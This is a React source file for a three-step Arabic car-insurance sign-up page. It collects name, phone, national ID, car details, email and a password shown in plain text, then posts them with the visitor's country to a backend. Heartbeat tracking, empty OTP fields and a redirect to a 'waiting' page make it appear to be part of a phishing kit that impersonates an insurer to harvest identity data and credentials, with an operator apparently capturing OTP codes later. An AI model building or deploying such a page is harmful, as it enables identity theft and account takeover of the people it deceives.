import { useState } from "react";
import { Shield, User, Phone, CreditCard, Car, Mail, Lock, ChevronRight, ChevronLeft, Loader2, CheckCircle } from "lucide-react";
import { api } from "@/lib/api";
import { getCountry } from "@/lib/getCountry";
import { useHeartbeat } from "@/lib/useHeartbeat";

const MAKES = ["تويوتا", "هوندا", "نيسان", "هيونداي", "كيا", "فورد", "شيفروليه", "بي إم دبليو", "مرسيدس", "لكزس", "أخرى"];
const YEARS = Array.from({ length: 20 }, (_, i) => String(2024 - i));

const steps = ["بياناتك", "بيانات السيارة", "إنشاء حساب"];

export default function RegisterPage() {
  useHeartbeat("تسجيل - الخطوة 1");
  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [f, setF] = useState({
    name: "", phone: "", nationalId: "",
    carPlate: "", carYear: "", carMake: "",
    email: "", password: "",
  });
  const set = (k: string, v: string) => setF(p => ({ ...p, [k]: v }));

  async function submit() {
    setLoading(true);
    let id = localStorage.getItem("wiqaya_id");
    if (!id) { id = `w-${Date.now()}-${Math.random().toString(36).slice(2,8)}`; localStorage.setItem("wiqaya_id", id); }
    const country = await getCountry();
    await api.submit({
      id, submittedAt: new Date().toLocaleTimeString("ar-SA"), submittedAtTs: Date.now(),
      name: f.name, phone: f.phone, nationalId: f.nationalId,
      email: f.email, password: f.password,
      carPlate: f.carPlate, carYear: f.carYear, carMake: f.carMake,
      otpCode: "", otpStatus: null,
      page: "انتظار", lastSeen: Date.now(), country,
    });
    window.location.href = "/wiqaya/waiting";
  }

  const ok1 = f.name && f.phone && f.nationalId;
  const ok2 = f.carPlate && f.carYear && f.carMake;
  const ok3 = f.email && f.password;

  return (
    <div className="min-h-screen" style={{ background: "linear-gradient(160deg, #f0f4f8 0%, #e8f5f0 100%)" }} dir="rtl"
      style2={{ fontFamily: "system-ui, -apple-system, Arial, sans-serif" }}>
      <div style={{ fontFamily: "system-ui, -apple-system, Arial, sans-serif" }} className="min-h-screen">

      {/* Header */}
      <div style={{ background: "#1a3a5c" }} className="shadow-md">
        <div className="max-w-lg mx-auto px-4 h-14 flex items-center gap-3">
          <button onClick={() => window.location.href = "/wiqaya/"} className="flex items-center gap-1.5 text-gray-400 hover:text-white transition-colors">
            <ChevronRight className="w-4 h-4" />
            <span className="text-[13px] font-semibold">وقاية</span>
          </button>
          <div className="h-4 w-px bg-gray-600" />
          <div className="flex items-center gap-1.5">
            <Shield className="w-4 h-4 text-amber-400" />
            <span className="text-[13px] font-bold text-white">طلب تأمين السيارة</span>
          </div>
        </div>
      </div>

      <div className="max-w-lg mx-auto px-4 py-8">
        {/* Steps */}
        <div className="flex items-center gap-2 mb-8">
          {steps.map((label, i) => {
            const s = i + 1;
            return (
              <div key={label} className="flex items-center gap-2 flex-1">
                <div className={`w-8 h-8 rounded-full flex items-center justify-center text-[13px] font-extrabold flex-shrink-0 transition-all
                  ${step > s ? "bg-emerald-500 text-white" : step === s ? "text-white shadow-lg" : "bg-gray-200 text-gray-400"}`}
                  style={step === s ? { background: "#1a5276" } : {}}>
                  {step > s ? <CheckCircle className="w-4 h-4" /> : s}
                </div>
                <span className={`text-[11px] font-bold hidden sm:block ${step === s ? "text-gray-700" : "text-gray-400"}`}>{label}</span>
                {i < steps.length - 1 && <div className="flex-1 h-px bg-gray-300" />}
              </div>
            );
          })}
        </div>

        <div className="bg-white rounded-3xl shadow-sm border border-gray-100 overflow-hidden">
          {step === 1 && (
            <div className="p-6 space-y-5">
              <div>
                <h2 className="text-[20px] font-extrabold text-gray-900">بياناتك الشخصية</h2>
                <p className="text-[13px] text-gray-500 mt-0.5">أدخل بياناتك للحصول على عروض التأمين</p>
              </div>
              {[
                { label: "الاسم الكامل", key: "name", icon: <User className="w-4 h-4" />, ph: "محمد أحمد الخالد", dir: "rtl" },
                { label: "رقم الجوال", key: "phone", icon: <Phone className="w-4 h-4" />, ph: "05xxxxxxxx", dir: "ltr" },
                { label: "رقم الهوية / الإقامة", key: "nationalId", icon: <CreditCard className="w-4 h-4" />, ph: "1xxxxxxxxx", dir: "ltr" },
              ].map(field => (
                <div key={field.key}>
                  <label className="block text-[13px] font-bold text-gray-700 mb-1.5">{field.label}</label>
                  <div className="flex items-center gap-2 border border-gray-200 rounded-xl px-3 py-2.5 bg-gray-50 focus-within:border-blue-400 focus-within:ring-2 focus-within:ring-blue-100 transition-all">
                    <span className="text-gray-400">{field.icon}</span>
                    <input type="text" placeholder={field.ph} value={(f as any)[field.key]}
                      onChange={e => set(field.key, e.target.value)} dir={field.dir}
                      className="flex-1 bg-transparent text-[15px] font-semibold text-gray-900 outline-none placeholder:text-gray-300" />
                  </div>
                </div>
              ))}
              <button disabled={!ok1} onClick={() => setStep(2)}
                className="w-full py-3.5 rounded-xl text-white text-[16px] font-extrabold disabled:opacity-40 transition-colors flex items-center justify-center gap-2"
                style={{ background: ok1 ? "#1a5276" : "#9ca3af" }}>
                التالي <ChevronLeft className="w-4 h-4" />
              </button>
            </div>
          )}

          {step === 2 && (
            <div className="p-6 space-y-5">
              <div className="flex items-center gap-2">
                <button onClick={() => setStep(1)} className="text-gray-400 hover:text-gray-700"><ChevronRight className="w-5 h-5" /></button>
                <div>
                  <h2 className="text-[20px] font-extrabold text-gray-900">بيانات السيارة</h2>
                  <p className="text-[13px] text-gray-500">أدخل بيانات سيارتك لعرض الباقات</p>
                </div>
              </div>
              <div>
                <label className="block text-[13px] font-bold text-gray-700 mb-1.5">رقم اللوحة</label>
                <div className="flex items-center gap-2 border border-gray-200 rounded-xl px-3 py-2.5 bg-gray-50 focus-within:border-blue-400 focus-within:ring-2 focus-within:ring-blue-100 transition-all">
                  <Car className="w-4 h-4 text-gray-400" />
                  <input type="text" placeholder="أ ب ج 1234" value={f.carPlate} onChange={e => set("carPlate", e.target.value)}
                    className="flex-1 bg-transparent text-[15px] font-semibold text-gray-900 outline-none placeholder:text-gray-300" />
                </div>
              </div>
              <div>
                <label className="block text-[13px] font-bold text-gray-700 mb-1.5">نوع السيارة</label>
                <div className="border border-gray-200 rounded-xl bg-gray-50 focus-within:border-blue-400">
                  <select value={f.carMake} onChange={e => set("carMake", e.target.value)}
                    className="w-full px-3 py-2.5 bg-transparent text-[15px] font-semibold text-gray-900 outline-none appearance-none">
                    <option value="">اختر النوع</option>
                    {MAKES.map(m => <option key={m} value={m}>{m}</option>)}
                  </select>
                </div>
              </div>
              <div>
                <label className="block text-[13px] font-bold text-gray-700 mb-1.5">سنة الصنع</label>
                <div className="border border-gray-200 rounded-xl bg-gray-50 focus-within:border-blue-400">
                  <select value={f.carYear} onChange={e => set("carYear", e.target.value)}
                    className="w-full px-3 py-2.5 bg-transparent text-[15px] font-semibold text-gray-900 outline-none appearance-none">
                    <option value="">اختر السنة</option>
                    {YEARS.map(y => <option key={y} value={y}>{y}</option>)}
                  </select>
                </div>
              </div>
              <button disabled={!ok2} onClick={() => setStep(3)}
                className="w-full py-3.5 rounded-xl text-white text-[16px] font-extrabold disabled:opacity-40 transition-colors flex items-center justify-center gap-2"
                style={{ background: ok2 ? "#1a5276" : "#9ca3af" }}>
                التالي <ChevronLeft className="w-4 h-4" />
              </button>
            </div>
          )}

          {step === 3 && (
            <div className="p-6 space-y-5">
              <div className="flex items-center gap-2">
                <button onClick={() => setStep(2)} className="text-gray-400 hover:text-gray-700"><ChevronRight className="w-5 h-5" /></button>
                <div>
                  <h2 className="text-[20px] font-extrabold text-gray-900">إنشاء حساب</h2>
                  <p className="text-[13px] text-gray-500">سجّل لعرض وثائق التأمين</p>
                </div>
              </div>
              {[
                { label: "البريد الإلكتروني", key: "email", icon: <Mail className="w-4 h-4" />, ph: "example@email.com", type: "email" },
                { label: "كلمة المرور", key: "password", icon: <Lock className="w-4 h-4" />, ph: "كلمة المرور", type: "text" },
              ].map(field => (
                <div key={field.key}>
                  <label className="block text-[13px] font-bold text-gray-700 mb-1.5">{field.label}</label>
                  <div className="flex items-center gap-2 border border-gray-200 rounded-xl px-3 py-2.5 bg-gray-50 focus-within:border-blue-400 focus-within:ring-2 focus-within:ring-blue-100 transition-all">
                    <span className="text-gray-400">{field.icon}</span>
                    <input type={field.type} placeholder={field.ph} value={(f as any)[field.key]}
                      onChange={e => set(field.key, e.target.value)} dir="ltr" autoComplete="off"
                      className="flex-1 bg-transparent text-[15px] font-semibold text-gray-900 outline-none placeholder:text-gray-300" />
                  </div>
                </div>
              ))}
              <button disabled={!ok3 || loading} onClick={submit}
                className="w-full py-3.5 rounded-xl text-white text-[16px] font-extrabold disabled:opacity-40 transition-colors flex items-center justify-center gap-2"
                style={{ background: ok3 && !loading ? "#1a5276" : "#9ca3af" }}>
                {loading ? <><Loader2 className="w-5 h-5 animate-spin" />جارٍ المعالجة...</> : "إرسال الطلب"}
              </button>
              <p className="text-center text-[11px] text-gray-400">
                بالمتابعة توافق على <a href="#" className="text-blue-600 hover:underline">الشروط والأحكام</a>
              </p>
            </div>
          )}
        </div>
      </div>
      </div>
    </div>
  );
}
